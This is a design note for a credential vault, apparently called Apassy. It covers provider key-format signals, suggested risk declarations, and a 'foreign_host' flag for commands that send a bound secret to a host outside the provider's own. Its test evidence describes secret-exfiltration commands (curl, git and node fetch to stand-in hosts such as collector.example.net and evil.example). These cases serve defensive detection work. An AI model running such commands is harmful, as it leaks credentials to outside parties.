# Suggested declarations and known hosts

Date: 2026-09-26. Decisions: [ADR 0008](../adr/0008-declarations-and-model-decisions.md) (declarations), [ADR 0009](../adr/0009-general-by-default-and-learning.md) ("Suggested declarations"), [ADR 0010](../adr/0010-closing-open-decisions.md). Goal item: B4 in [goal.md](../goal.md).

## 1. Summary

- When the owner adds or changes an item, Apassy suggests a declaration from the item: the provider, the environment, the risk, the scope, and the reversibility. Each value has a reason.
- The owner confirms or changes each value. The save needs the owner check (goal item A4).
- The declaration stores the provider (vault schema 8). The broker gives the known API hosts of that provider to the command analysis.
- A command that sends a bound secret of the item to another host gets the flag `foreign_host`. The run waits for the owner.
- The vault records whether the owner saved each suggestion without a change. The app shows the share.
- On 66 synthetic credentials, 34 suggestions (52%) match the declaration of a careful owner in all fields. The most sensitive defaults alone match 17 (26%). Section 4 has the numbers for each field.

## 2. Provider data

### Files

The provider data is in `packs/providers/`, one JSON file for each provider. The build embeds the files (`include_str!` in `src/vault/providers.rs`). Only an app release changes them. There are no local provider files.

| File | Provider | Known hosts | Signals (examples) |
| --- | --- | --- | --- |
| `anthropic.json` | Anthropic | api.anthropic.com | `sk-ant-api`, `sk-ant-admin` |
| `aws.json` | Amazon Web Services | amazonaws.com | `AKIA` and `ASIA` access key IDs, `AWS_*` variables |
| `cloudflare.json` | Cloudflare | api.cloudflare.com | `CLOUDFLARE_API_KEY` (global key), `CLOUDFLARE_API_TOKEN` |
| `datadog.json` | Datadog | datadoghq.com, datadoghq.eu, ddog-gov.com | `DD_API_KEY`, `DD_APP_KEY` |
| `gcp.json` | Google Cloud | googleapis.com | service account key (JSON `"type": "service_account"`), `AIza` API keys |
| `github.json` | GitHub | api.github.com, github.com, uploads.github.com | `ghp_`, `github_pat_`, `gho_`, `ghu_`, `ghs_`, `ghr_` |
| `neon.json` | Neon | neon.tech | `*.neon.tech` database hosts, `NEON_*` variables |
| `netlify.json` | Netlify | api.netlify.com | `nfp_`, `NETLIFY_AUTH_TOKEN` |
| `openai.json` | OpenAI | api.openai.com | `sk-proj-`, `sk-svcacct-`, `sk-admin-` |
| `planetscale.json` | PlanetScale | api.planetscale.com, psdb.cloud | `pscale_tkn_`, `pscale_oauth_`, `pscale_pw_` |
| `postgres.json` | PostgreSQL (generic) | none | `postgres://`, `postgresql://` |
| `resend.json` | Resend | api.resend.com | `re_` |
| `sendgrid.json` | SendGrid | api.sendgrid.com | `SG.` |
| `sentry.json` | Sentry | sentry.io | DSN host `*.ingest.sentry.io`, `sntrys_`, `sntryu_` |
| `stripe.json` | Stripe | api.stripe.com, files.stripe.com, connect.stripe.com, uploads.stripe.com | `sk_live_`, `sk_test_`, `rk_live_`, `rk_test_`, `pk_live_`, `pk_test_` |
| `supabase.json` | Supabase | supabase.co, supabase.com | JWT role `service_role` or `anon`, `sb_secret_`, `sb_publishable_`, `sbp_` |
| `twilio.json` | Twilio | twilio.com | `AC` account SID, `SK` API key SID, `TWILIO_AUTH_TOKEN` |
| `vercel.json` | Vercel | api.vercel.com | `VERCEL_TOKEN` |
| `general.json` | none | none | words and hosts for any credential: prod, staging, test, dev, local, localhost, read-only, admin |

The files use only public, documented key formats. Each provider file also has signals for the variable name, the item name, and the hosts of the provider. A known host also covers its subdomains.

### Format

A file is one JSON object. The loader rejects unknown fields at every level, and it checks the values.

| Field | Meaning |
| --- | --- |
| `schema_version` | The file format. This version of Apassy reads version 1 only. |
| `provider_version` | The version of the content. It starts at 1. Increase it at each change. |
| `id` | A unique name: lowercase letters, digits, `-`, `_`. The file name is `<id>.json`. The declaration stores this name. |
| `kind` | `provider`, or `general` for signals without a provider. |
| `label`, `description` | Text for the owner. |
| `generic` | Optional. A generic provider (PostgreSQL) loses to a specific provider (Supabase, Neon). |
| `known_hosts` | Provider API hosts in lowercase. A provider needs one or more, unless it is generic. A general file has none. |
| `signals` | A list of signals: `id`, `when`, `suggest`, `reason`. |

`suggest` has the optional fields `environment`, `risk`, `scope`, and `reversibility`, with the values of ADR 0008. A general signal must suggest a field. `reason` is one or two sentences for the owner.

All conditions in `when` must hold. A list means "one of the items".

| Condition | Holds when | Strength |
| --- | --- | --- |
| `value_starts`, `value_contains` | A field value starts with or contains a text. Case matters. | 3 |
| `value_shape` | A field value is a prefix of `starts`, and the rest has `min_len` to `max_len` characters of the set `chars` (`lower_hex`, `upper_alnum`, `alnum`, `token`). | 3 |
| `jwt_claims` | A field value is a JWT, and each claim of the payload is one of the texts. | 3 |
| `json_fields` | A field value is a JSON object, and each named field is one of the texts. The parser keeps only the named fields. | 3 |
| `hosts` | A host of the item is in the list, or is a subdomain of one. | 2 |
| `env_names`, `env_name_contains` | The environment variable of the item or a field name is, or contains, a text. | 1 |
| `words` | A word or a phrase is in the names and labels. | 0 |

What the detection reads from an item:

- Names and labels: the title, the tags, the variable name, the field names, the plain field values (not the public key), and the labels of each host (`db.prod.example.com` gives `db`, `prod`, `example`, `com`). A secret value gives no words.
- Hosts: the host of each `scheme://` URL in a field value or in the notes, and the `host` field.
- Values: every field value, for the value conditions.

### Rules for the result

- Every matching signal adds its fields.
- When signals suggest different values for one field, the suggestion takes the more sensitive value. The reason names the other values and says "The signals disagree, so Apassy chose the more sensitive value". The form shows this reason in the ask color.
- A field without a signal keeps the most sensitive value: production, high, admin, irreversible (ADR 0008).
- The provider is the provider with the strongest matching signal. A specific provider wins over a generic provider.

## 3. Suggestions in the app

1. The owner adds an item, or saves a change of an item. The app computes the declaration form with `OwnerSession::declaration_form` (`Vault::suggest_declaration`). This runs only in the owner flow, with the vault unlocked. The broker never runs the detection.
2. The detection reads the field values in the owner process. The values stay in erasing buffers (`Zeroizing`). The suggestion has the provider name, the field values, and the reasons from the data files. It has no secret value.
3. The Declaration sheet (open a credential, then "Agent access" > "Declaration") shows:
   - the provider, with a choice of "None" or a built-in provider, and the known hosts of the chosen provider,
   - each field as a segmented control, filled with the suggested value, or with the most sensitive default when no signal matched,
   - "Apassy suggested VALUE. You changed it." under a field when the owner changed a suggested value, and the reason when signals disagree,
   - "Why these values?", which opens the reasons of the suggestion,
   - the acceptance share (section 5).
4. "Save" opens the owner check (`OwnerAction::ChangeItemRules`). The vault stores the declaration and the provider in one transaction. The sheet closes when the check passes.
5. An item with a stored declaration shows the stored values. The suggestion stays as a hint.

The review card after a restore (goal item V4) shows the provider, because the provider gives known hosts to the analysis.

## 4. Synthetic evaluation

### Set

`tests/fixtures/declarations/synthetic.jsonl` has 66 fake credentials of 18 providers and of no provider (5 items). Each line has the item (title, notes, tags, fields, variable) and the declaration that a careful owner chooses. The values are templates, such as `sk_live_{fake:24}`. The test expands them. The repository has no text in the form of a real key.

The labels were committed (commit `5e833e6`) before the provider files and the detection. The labels follow this policy:

- Environment: the environment that the credential can act on. The item text (prod, live, staging, test, sandbox, dev, local) or the key mode (Stripe live and test keys, Twilio test credentials) tells it. A token for the whole account of a hosting provider can deploy to production, so its environment is production. Without a hint, production.
- Risk: high for production credentials that change data, money, messages, or infrastructure, and for admin credentials in production. Medium for production read-only access to private data, for limited or expiring production credentials, and for staging and development credentials with wide access. Low for test mode, local data, and public keys.
- Scope: from the key type and the item text. Unknown is admin.
- Reversibility: irreversible for money, sent messages, and deletion of production data. Partial for deployments, configuration, infrastructure, and spend. Reversible for read-only access, test mode, local data, and development data.

### Results

The test `synthetic_evaluation_matches_the_recorded_numbers` puts each credential into a vault, gets the suggestion, and saves the owner declaration. So the vault records the outcome of each suggestion, with the same code as for the real owner (section 5).

| Measure | Result |
| --- | --- |
| Credentials | 66 |
| Suggestion matches in all fields (provider and four declaration fields) | 34 (52%) |
| Suggestion matches in the four declaration fields | 34 (52%) |
| The most sensitive defaults alone match (the form before B4) | 17 (26%) |
| Items with a conflict of signals | 1 |

| Field | Matches | A signal gave the value | Defaults alone match |
| --- | --- | --- | --- |
| provider | 66 (100%) | 61 | 5 (no provider) |
| environment | 64 (97%) | 30 | 45 |
| risk | 48 (73%) | 47 | 31 |
| scope | 48 (73%) | 37 | 33 |
| reversibility | 46 (70%) | 36 | 24 |

The 32 suggestions with a change:

| Cause | Items | Fields |
| --- | --- | --- |
| A staging, test, or development credential. The general words suggest only the environment, so risk and reversibility stay at the sensitive default. | 13 | risk, often reversibility, sometimes scope |
| The scope of a production database URL or token is not in the key format. The default admin stays. The owner chose read-write. | 10 | scope, often reversibility |
| A read-only credential. The words suggest read-only, but the risk and reversibility stay sensitive. | 4 | risk, reversibility |
| A Google API key (`AIza`): the key format gives the provider only. | 1 | risk, scope, reversibility |
| A Sentry user token (`sntryu_`): the scopes are not in the key. | 1 | reversibility |
| A Stripe restricted test key (`rk_test_`): its permissions are not in the key. | 1 | scope |
| A `sk_test_` key with "prod" in a host of the notes. The conflict takes production. The owner chose staging, because the key reaches test data only. | 1 | environment |
| A Vercel token with "preview" in the name. The owner chose production, because the token can deploy to production. | 1 | environment |

In 57 fields, the suggestion is more sensitive than the owner's choice. In 1 field, it is less sensitive: the Vercel token with "preview" in its name gets staging, but the token can deploy to production. If the owner accepts that suggestion without a look, runs with the token do not wait for the owner as a production item. The card shows the reason ("A name, a label, or a host says staging"), and the owner must confirm the value. Section 8 lists this limit.

Run the evaluation: `cargo test --features vault --test declaration_suggestions -- --nocapture`. The test prints one line for each credential and the table above. It fails when a number is different from this section. After an intended change of a provider file, update this section and the constants in the test in the same commit.

## 5. The real owner share

### What the vault records

For each item, the first save of a declaration with a suggestion gives one record (table `suggestion_outcome`, schema 8):

- the suggested form: the provider, the four fields, and the fields that came from a signal,
- the fields that the owner changed before the save: provider, environment, risk, scope, or reversibility,
- accepted: 1 when the owner changed no field.

The record has no secret value and no reason text. A later change of a stored declaration is not a new record. A change of a default field without a signal also counts as a change, because the owner saw the whole form. A deleted item takes its record with it. A backup and a restore keep the records.

### How to read the share

Declaration sheet, last line:

> Suggested declarations saved without a change: 7 of 9 (78%). Changed fields: risk 2, scope 1.

- The first number is the count of records with no change. The second is the count of all records.
- "Changed fields" gives, for each field, the count of saves that changed it. A field that the owner changes often is a candidate for a better signal in a provider file.
- Before the first save, the line is "No suggested declaration is saved yet."
- The share grows with use. Compare it with the synthetic result (52%) only after about 20 records.

## 6. Known hosts in the command analysis

### Behavior

1. For each item of a run, the broker reads the stored provider name of the declaration (`Vault::declaration_provider`). It does not run the detection. An unknown name, or a provider without known hosts (PostgreSQL), adds nothing.
2. The broker calls `shell_risk::analyze_run` with the variable name and the known hosts of each such item.
3. The provider hosts join the global known hosts of the rule packs (`packs/http.json`). A secret in an auth header to a provider host is normal use. A GET request to a provider host can be known safe.
4. The flag `foreign_host` goes on a pipeline that:
   - names a bound secret of an item with provider hosts (`$NAME`, `${NAME}`, `process.env.NAME`, `os.environ['NAME']`, `getenv('NAME')`), and
   - has a URL host (`scheme://host`) that is not a host of that provider and not a global known host.

   The check reads the words, the `NAME=value` prefixes, the redirect targets, and the here-documents. A rule flag asks the owner (ADR 0008).
5. Without provider hosts, `analyze_run` gives the same result as `analyze`.

### Evidence

| Check | Result |
| --- | --- |
| Golden replay (`tests/analysis_replay.rs`, `analyze` without items) | 62074 commands, 0 different lines |
| `analyze_run` without provider hosts, and with an item without hosts (`a_run_without_provider_hosts_is_unchanged`) | the same as `analyze` |
| A provider host is allowed (`a_provider_host_is_allowed`, unit test and broker run) | `curl` with an auth header to `api.sendgrid.com` for an item with the SendGrid provider: no flag, the run starts. The same item without a provider: `secret_output`, the run waits. |
| A foreign host with a secret gets the flag (`a_foreign_host_with_a_secret_is_flagged`, unit test and broker run) | `curl` to `collector.example.net`, `git ls-remote https://x:$KEY@git.example.net/...`, `node -e "fetch(...process.env.KEY)"`, and `api.sendgrid.com.example.net`: `foreign_host`. Without a provider: no `foreign_host`. |
| The replay fixture sets (2074 commands) with the providers of their four secrets: Supabase, PostgreSQL, Resend, Twilio (`provider_hosts_change_only_the_host_flags_on_the_replay_sets`) | 9 commands change. Each one keeps its flags and gets `foreign_host`. All 9 already had `secret_output` (secrets sent to `evil.example`, `webhook.site`, and similar hosts). No flag goes away. No command becomes known safe. |

## 7. Schema 8

One atomic migration step from version 7 to version 8 (`src/vault/suggestions.rs`):

- `declaration.provider TEXT NOT NULL DEFAULT ''`: the provider ID, or empty for none. A migrated declaration has no provider.
- Table `suggestion_outcome`: `item_id` (primary key), `at`, `provider`, `environment`, `risk`, `scope`, `reversibility`, `from_signals`, `changed`, `accepted`.

`tests/vault_migration.rs` builds a vault of each version from 1 to 7 with data. Version 7 has a decision log entry, a blocked pattern, and a calibration. After unlock, each file is at version 8, all data is present, and the provider and the suggestion record work. `a_failed_migration_from_version_7_keeps_the_old_version_and_data` shows that a failed step from 7 to 8 leaves the file at version 7.

## 8. Limits

- The signals are heuristics. A key format tells the provider and the mode. It does not tell the permissions of a restricted key or a fine-grained token, so the scope often stays at admin.
- The general words suggest only the environment. A staging or development credential keeps a high risk and an irreversible default. Section 4 shows the cost: 13 of 32 changes.
- A word in a name can make the environment lower than production for a token that acts on a whole account, for example "preview" or "dev" in the name of a Vercel token. The owner must check the environment of such a token. A production declaration is the only declaration that makes every run wait (ADR 0010).
- The same person wrote the labels and the provider files. The labels came first and follow a written policy, but the set is not independent. The real owner share (section 5) is the independent measure.
- A secret that goes to a global known host of another provider, for example a Stripe key to `api.github.com`, gets no `foreign_host`. The goal item defines the flag for hosts outside the provider hosts and the global list.
- The analysis sees a host only in a `scheme://` URL. A host in an option (`psql -h db.example.net`), a host from a variable (`$SUPABASE_URL`), or a secret that a program reads from its environment by itself is not seen. The model and the other rules still apply.
- The shell parser splits an unquoted `${NAME}` at the braces. In an unquoted word, the analysis does not see `${NAME}` as one reference. `$NAME` and quoted text work.
- A provider without known hosts (PostgreSQL) gives no `foreign_host`, because its host is the database host of the item.
- The owner can choose a wrong provider. Its known hosts then relax the analysis for that item. The save needs the owner check, and a restore asks the owner to review the provider.

## 9. Checks

Results on 2026-09-26:

| Command | Result |
| --- | --- |
| `cargo fmt --check` | PASS |
| `cargo clippy --locked --all-targets --features desktop,vault -- -D warnings` | PASS |
| `cargo test --locked --features desktop,vault` | PASS. `declaration_suggestions`: 3 tests. `provider_hosts`: 3 tests. `vault_migration`: 5 tests. `analysis_replay`: 62074 commands, 0 differences. Library unit tests: 126, 1 ignored. |
